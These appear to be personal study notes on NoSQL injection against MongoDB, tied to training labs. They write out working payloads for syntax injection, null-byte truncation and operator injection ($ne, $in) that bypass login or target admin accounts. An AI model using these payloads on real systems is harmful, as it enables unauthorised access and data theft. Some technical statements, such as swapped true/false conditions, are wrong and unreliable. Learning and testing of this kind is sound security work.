SQL injection si when you able to execute database commands from a backend server.
![[Pasted image 20241027171915.png]]
This avaible you to:
- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.
For more information check [[Injection]] in APIS
There are two different types of NO-SQLI:
##### Syntax Injection
The attacker aimed to break the syntax of the Mongo query, imagine you got the following request with this syntax:
```js
db.users.find({ "username": "user1", "password": "pass" })
```
So you could craft a payload which always will return true:
```js
db.users.find({ "username": "user1", "password": { "$ne": null } })
```
We'll see it more clear soon
##### Operator injection 
This occurs when you can use NoSQL query operators to manipulate queries, for example:
```js
db.users.find({ "username": "user1", "password": "pass123" })
```
And then inject:
```js
db.users.find({ "username": "user1", "password": { "$gt": "" } })
```
As the pasword will be always greater than an empty string whis will return false. we'll retake on this later

------
## Syntax Injection
### Testing for Syntax Injection 
So to detect this we need to cause an error on the datas base with the provided strings:
```
'"`
{ ;$Foo} 
$Foo \xYZ
```
So imagine you got a URL with the following query:
```url
https://insecure-website.com/product/lookup?category=fizzy
````
use the following url:
```url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.
###### Determining which character is proseced
To know what character is causing the issue we can check one by one, as submit `'`, so the mongo db query would be like this:
```
this.category == '''
```
And if this response differ from the original that may indicate that you broke the query syntax, you could confirm this by sending a correct syntax:
```
this.category == '\''
```
###### Confirming conditional behavior
So to confirm this we shpuld to send 2 conditions, one true, `' && 0 && 'x`, and other false, `' && 1 && 'x`:
```url
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```
and the true one:
```url
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
###### Overriding existing conditions
Once you identified this you can attempt to override existing conditions to exploit the vulnerability, for this you can use a JS condition that alwas will be true `'||'1'=='1`
```url
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```
and this result in the following mongodb query:
```js
this.category == 'fizzy'||'1'=='1'
```
Following this we'll solved the lab: [[lab-nosql-injection-detection]]

--------
## Operator Injection
### Null byte
##### Example introduction
For this example will need to understand the `this.release` Mongodb method, which works to bring certain elements and hidden other (for example an application use that to get the 'Actives' users and not get others like 'AFK'). Then we got the following query:
```js
this.category == 'fizzy' && this.released == 1
```
This query limits the results to products with the specified `category` that have also been marked as released (`released == 1`).

This is nice, but There's a conflicting character which cause to ignore all the character after it. So this means that any additional conditions on the MongoDB query are ignored. By adding a null byte (`%00`), as in `category=fizzy'%00`, the injected payload can terminate the query early if MongoDB (or the application layer) stops processing characters after the null byte.

#### So what are the Operator Injection

In some cases we are be able to use operan, which are built in operator of mongodb as the follow ones:
   - NoSQL databases like MongoDB use query operators to specify conditions within queries.
   - Common MongoDB operators include:
     - `$where`: Matches documents satisfying a JavaScript expression.
     - `$ne`: Matches values not equal to the specified value.
     - `$in`: Matches values specified in an array.
     - `$regex`: Matches documents based on a regular expression.
#### **Injecting Query Operators**
   - **JSON Injection**: Operators can be inserted as nested JSON objects, instead of strings.
     - Example: `{"username":"wiener"}` → `{"username":{"$ne":"invalid"}}`
   - **URL-Based Injection**: For URL parameters, try injecting operators directly.
     - Example: `username=wiener` → `username[$ne]=invalid`
   - If this doesn’t work:
     1. Change the HTTP method from `GET` to `POST`.
     2. Set `Content-Type` to `application/json`.
     3. Include JSON data in the body, injecting operators within JSON.

   - **Tools**: Burp Suite’s **Content Type Converter** can help automatically convert requests from URL-encoded to JSON format for easier injection.

#### **Testing for Operator Injection Vulnerabilities**

Consider we got an endpoint accepting credentials, like a `POST` request with JSON:
```json
     {"username":"wiener","password":"peter"}
```
   - To test for operator injection, replace `username` or `password` values with an operator, such as `$ne`:
     ```json
     {"username":{"$ne":"invalid"},"password":"peter"}
     ```
   - If the operator is accepted, it will authenticate users who don’t have the username “invalid.”

If we inject this in both fields we could completely bypass all the authentication
```json
     {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
   - This matches all users where both fields aren’t “invalid,” potentially logging in as the first user in the collection.

#### **Targeting Specific Users**

   - To target a known or guessed username, you can use operators like `$in` with an array of common usernames:
     ```json
     {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
     ```
   - This payload returns users matching any username in the `$in` array and where the password isn’t empty, potentially exposing privileged accounts. 

Using these techniques, operator injection can enable access control bypasses, unauthorized data access, or privilege escalation within NoSQL applications.

check [[lab-nosql-injection-extract-data]]